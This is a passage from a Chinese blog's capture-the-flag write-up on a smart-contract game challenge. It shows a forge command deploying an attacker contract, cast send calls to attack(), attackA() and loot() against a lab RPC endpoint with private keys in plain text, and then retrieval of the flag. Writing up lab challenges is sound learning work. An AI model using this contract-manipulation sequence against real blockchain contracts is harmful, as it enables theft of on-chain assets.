+<p>用游戏给我们的私钥进行签名认证。然后在将target address作为<code>Creature _creature</code>的生成初始化变量传入到里面的对象，这样我们的合约内的对象就与游戏的对象连到了一起。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">forge create src/attc.sol:flower --rpc-url <span class="string">&quot;http://94.237.52.48:35311/rpc&quot;</span> --private-key 0x8a277e85b81b9f66613490f2ba53a40bce5a65f6aecce9e06f3f59aa48ec271c --constructor-args 0x276B1607C79025D125E010740cA3ECD3656F9C54</span><br><span class="line">[⠊] Compiling...</span><br><span class="line">[⠰] Compiling 27 files with 0.8.24</span><br><span class="line">[⠘] Solc 0.8.24 finished <span class="keyword">in</span> 4.36s</span><br><span class="line">Compiler run successful!</span><br><span class="line">Deployer: 0x0B0c991073613cF3D49cf8360696F9046aEc871f</span><br><span class="line">Deployed to: 0xF68da11A8582ba729e9d8724a4d02718D5fd5207</span><br><span class="line">Transaction <span class="built_in">hash</span>: 0x93d17dcc93173ea6c3390c25ee6e44930c5b602d90727bbc18af92271939f7b0</span><br></pre></td></tr></table></figure>
+<p>同时还会得到我们自己合约在链上的地址与哈希</p>
+<blockquote>
+<p>Deployer: 部署者地址，即发起部署操作的账户地址。在这里是 &gt;0x0B0c991073613cF3D49cf8360696F9046aEc871f。</p>
+<p>Deployed to: 合约部署地址，即智能合约在区块链上的部署地址。在这里是 &gt;0xF68da11A8582ba729e9d8724a4d02718D5fd5207。</p>
+<p>Transaction hash: 交易哈希，即进行合约部署操作的交易的哈希值。它用于在区块链上查找该交易的详情和状态。在这里&gt;0x93d17dcc93173ea6c3390c25ee6e44930c5b602d90727bbc18af92271939f7b0</p>
+</blockquote>
+<h4 id="调用部分"><a href="#调用部分" class="headerlink" title="调用部分"></a>调用部分</h4><p>1.先用EOA，也就是用户直接对目标地址发起请求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast send <span class="string">&quot;0x6a1A3839D25AD2A31Ed0c1d5Cbc10e08958Bb05f&quot;</span> --rpc-url http://94.237.52.48:35311/rpc --private-key 0xf6235a58909371d81b25c276be0fe1f5e66dbf2a8ee15a25476c4139bb56e87e <span class="string">&quot;attack(uint256)&quot;</span> 0</span><br></pre></td></tr></table></figure>
+
+<p>2.再调用我们的合约，对我们上线的合约发起请求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast send <span class="string">&quot;0xF68da11A8582ba729e9d8724a4d02718D5fd5207&quot;</span> --rpc-url http://94.237.52.48:35311/rpc --private-key 0xf6235a58909371d81b25c276be0fe1f5e66dbf2a8ee15a25476c4139bb56e87e <span class="string">&quot;attackA(uint256)&quot;</span> 1000</span><br></pre></td></tr></table></figure>
+
+<p>3.没报错的话就是调用成功了，到此就可以调用游戏的合约的loot()结算了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast send <span class="string">&quot;0x6a1A3839D25AD2A31Ed0c1d5Cbc10e08958Bb05f&quot;</span> --rpc-url http://94.237.52.48:35311/rpc --private-key 0xf6235a58909371d81b25c276be0fe1f5e66dbf2a8ee15a25476c4139bb56e87e <span class="string">&quot;loot()&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问<a target="_blank" rel="noopener" href="http://url/flag%E6%8B%BFflag%E7%BB%93%E6%9D%9F%E4%BA%86">http://url/flag拿flag结束了</a></p>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left  disabled "
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2024/02/19/box-office-wp/"
+      title="【season-4】htb office wp"
+     >
+
+    <p class="title-text">
+      
+        【season-4】htb office wp
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2024 Flower<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
